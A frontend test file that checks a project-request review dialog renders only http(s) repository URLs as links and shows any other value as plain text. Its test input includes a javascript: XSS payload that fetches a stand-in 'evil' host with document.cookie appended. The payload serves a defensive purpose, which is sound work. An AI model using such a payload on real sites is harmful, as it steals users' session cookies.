import type { ProjectEditRequest } from '@repo/shared/types';
import { createClubMember, renderWithProviders, screen, within } from '@repo/test-utils';
import { describe, expect, it } from 'vitest';

import RequestReviewDialog from '.';

const pendingRequest: ProjectEditRequest = {
  id: 3,
  originalProjectId: null,
  requestedBy: createClubMember({ id: 1, name: '김신청' }),
  name: 'DataGSM',
  description: '학교 데이터 API',
  startYear: 2024,
  iconUrl: null,
  iconKey: null,
  deploymentUrl: null,
  club: null,
  participants: [],
  repositories: [],
  techStacks: [],
  requestStatus: 'PENDING',
  rejectReason: null,
  requestedAt: '2026-03-05T09:00:00',
  processedAt: null,
};

const dialog = () => screen.getByRole('dialog');

describe('RequestReviewDialog', () => {
  it('http(s)가 아닌 리포지토리는 링크로 걸지 않고 글자로만 보여 준다', () => {
    const safeRepo = 'https://github.com/themoment-team/datagsm-client';
    const unsafeRepo = "javascript:fetch('//evil?'+document.cookie)";

    renderWithProviders(
      <RequestReviewDialog
        request={{ ...pendingRequest, repositories: [safeRepo, unsafeRepo] }}
        open
        onOpenChange={() => {}}
      />,
    );

    expect(within(dialog()).getByRole('link', { name: safeRepo })).toHaveAttribute(
      'href',
      safeRepo,
    );
    expect(within(dialog()).getByText(unsafeRepo).closest('a')).toBeNull();
    expect(within(dialog()).queryByRole('link', { name: unsafeRepo })).not.toBeInTheDocument();
  });
});
